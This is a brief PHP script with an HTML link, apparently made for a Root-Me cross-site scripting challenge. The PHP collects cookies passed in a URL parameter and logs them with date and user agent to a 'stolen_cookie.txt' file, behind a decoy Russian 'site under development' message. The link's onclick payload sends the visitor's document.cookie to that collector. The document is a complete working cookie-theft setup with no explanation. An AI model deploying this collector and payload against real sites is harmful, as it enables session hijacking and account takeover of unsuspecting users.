<?php
  //phpinfo();
  $collectedCookie=$_GET["cookie"];
  $date=date("l ds of F Y h:i:s A");
  $user_agent=$_SERVER['HTTP_USER_AGENT'];
  $file=fopen('/home/vald/stolen_cookie.txt','a');
  fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
  fclose($file);
  echo '<b>Извините, сайт находится в состоянии разработки. </b></br></br>Пожалуйста, нажмите<a
  href="http://challenge01.root-me.org/web-client/ch18/#">здесь</a>, чтобы перейти на предыдущую страницу';
?>
<a onclick="document.location='http://127.0.0.1/collect_cookie.php?cookie='+escape(document.cookie);" href="#">Click here for Details</a>
